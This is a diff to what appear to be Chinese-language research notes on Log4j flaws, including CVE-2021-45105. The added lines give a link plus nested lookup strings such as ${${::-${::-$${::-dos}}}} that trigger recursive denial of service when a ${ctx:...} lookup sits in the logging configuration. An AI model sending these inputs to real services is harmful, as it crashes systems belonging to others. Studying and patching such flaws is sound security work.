@@ -177,7 +177,15 @@ https://www.zerodayinitiative.com/blog/2021/12/17/cve-2021-45105-denial-of-servi
 
 https://github.com/apache/logging-log4j2/commit/806023265f8c905b2dd1d81fd2458f64b2ea0b5e#diff-3f056c67add25837df0d7d8b8ab22df492dc14e3c5bae5f2914e69ac8af8d5cc
 
+更新 2021/12/22
 
+https://mp.weixin.qq.com/s?__biz=MzU5MjEzOTM3NA==&mid=2247490570&idx=1&sn=279f4c19c266dd2f443088e33786f867&chksm=fe25190bc952901d1a754f78802b3dd1fd1d3107cd0d92f54b62c64797e966962427ca989126&mpshare=1&scene=23&srcid=1222cs3lrxzG5cIJHSfdgcOe&sharer_sharetime=1640169352847&sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd
+
+
+```
+在配置文件中配置：$${ctx:apiVersion}   则输入 ${${ctx:apiVersion}}或${${::-${::-$${::-aaa}}}}则可以造成递归dos
+在配置文件中配置：${ctx:apiVersion}   则输入${${::-${::-$${::-dos}}}}则可以造成递归dos
+```
 
 ## 总结一下
 
